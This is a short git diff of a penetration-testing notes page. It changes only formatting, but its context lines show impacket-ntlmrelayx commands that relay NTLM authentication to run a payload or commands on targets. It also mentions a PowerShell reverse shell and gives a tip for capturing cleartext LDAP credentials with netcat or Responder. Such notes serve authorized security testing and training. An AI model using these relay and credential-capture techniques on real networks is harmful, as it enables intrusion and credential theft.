@@ -128,7 +128,8 @@ impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
 
 Execute a command:
 
-<pre><code><strong>impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"</strong></code></pre>
+<pre><code><strong>impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+</strong></code></pre>
 
 You can also use a PowerShell Reverse Shell!
 
@@ -262,7 +263,7 @@ Step 4: CD into /LOOTME directory to obtain loot!
 
 Example w LDAP:
 
-<figure><img src="../../../../.gitbook/assets/image (8) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (8) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">If you were to change this LDAP address to your IP address, and you set up a netcat listener or Responder, you can capture cleartext credentials.</mark>
 * <mark style="color:yellow;">It does not matter how secure or long the password is!</mark>
